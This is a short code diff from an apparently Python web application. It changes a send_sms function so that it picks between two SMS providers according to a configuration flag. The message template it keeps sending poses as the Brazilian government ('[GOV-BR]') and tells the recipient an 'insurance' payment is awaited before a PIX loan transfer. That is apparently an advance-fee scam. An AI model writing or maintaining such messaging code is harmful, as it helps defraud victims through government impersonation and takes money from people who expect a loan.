@@ -323,8 +323,11 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
         # Message template
         message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."
 
-        # Sempre usar a API SMSDEV para confirmações de pagamento
-        return send_sms_smsdev(phone_number, message)
+        # Escolher qual API usar com base na configuração global, para mensagens de pagamento gerado
+        if SMS_API_CHOICE.upper() == 'OWEN':
+            return send_sms_owen(phone_number, message)
+        else:  # Default to SMSDEV
+            return send_sms_smsdev(phone_number, message)
 
     except Exception as e:
         app.logger.error(f"Error in send_sms: {str(e)}")
